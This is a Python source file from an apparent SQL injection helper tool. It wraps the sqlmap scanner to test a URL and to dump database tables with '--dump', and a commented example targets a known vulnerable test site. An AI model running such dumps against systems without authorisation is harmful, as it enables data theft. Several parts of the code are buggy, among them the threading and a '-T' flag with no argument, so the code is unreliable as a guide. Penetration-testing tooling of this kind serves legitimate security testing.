import os
import sys
current_directory = os.getcwd()
sys.path.append(current_directory)
from threading import Thread
from logger.logs import logger
from Exceptions.exceptions import SQLJNGFatalError
from lib.mysqlerrorbased.OPS.OSY import Operatingsystem
from lib.mysqlerrorbased.OPS.Platforms import Platforms
from Exceptions.exceptions import SQLJNGFatalError
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from Exceptions.exceptions import SQLJNGOSError
import subprocess
from dataclasses import dataclass
import threading

#Reference :https://stackoverflow.com/questions/32382793/inheritance-threading-thread-class-does-not-work

@dataclass
class SQLmap(Thread):
    url : str
    username : bool
    password : bool
    dump : bool
    columns : bool
    tables : bool
    auto : bool
    os = Operatingsystem()
    platform = Platforms()

    def _Check_SQlmap(self):
        try:
            if self.os != self.platform.LINUX:
                raise SQLJNGOSError
            
            elif self.os == self.platform.LINUX:
                cmd = subprocess.check_output(["sqlmap","--version"])
                msg = "sqlmap version:"
                msg += str(cmd.decode('utf-8') if type(cmd) != int else "")
                logger.info(msg)
                return True

        
        except (subprocess.CalledProcessError,subprocess.SubprocessError) as exc:
            logger.error(exc)
            return False


        except SQLJNGOSError:
            logger.critical("Sqlmap cannot be executed in your system.")
            return False
        
        except KeyboardInterrupt:
            logger.info("Aborted")
            return False
        
    
    def exploit(self):
        if self._Check_SQlmap():
            try:
                #Reference:https://stackoverflow.com/questions/89228/how-do-i-execute-a-program-or-call-a-system-command
                cmd = subprocess.Popen(["sqlmap","-u",str(self.url)])
                cmd.wait()
                print(cmd)
                if self.tables:
                    cmd = subprocess.Popen(["sqlmap","-u",str(self.url),"-T"])
                    cmd.wait()
                    print(cmd)
                
                elif self.auto:
                    cmd = subprocess.Popen(["sqlmap","-u",str(self.url),"--dump"])
                    cmd.wait()
                    print(cmd)

                    
            
            except (subprocess.CalledProcessError,subprocess.SubprocessError) as err:
                logger.error(err)
            
            except KeyboardInterrupt:
                logger.info("Aborted")
            
        else:
            logger.critical("Your system cannot execute sqlmap")

    def Dump_the_tables(self):
        if self._Check_SQlmap() and self.dump is True:
            cmd =subprocess.Popen(["sqlmap","-u",str(self.url)])
            cmd.wait()

    
    def execute_all(self):
        threads  = [
            self.Dump_the_tables(),
            self.exploit()
        ]
        for thread in threads:
            var = Thread(thread)
            var.start()
            var.join()


            
            
                

                
            
    
    def run(self):
        pass



# obj = SQLmap("http://testphp.vulnweb.com/artists.php?id=1",False,False,True,False,False,False)
# obj.execute_all()

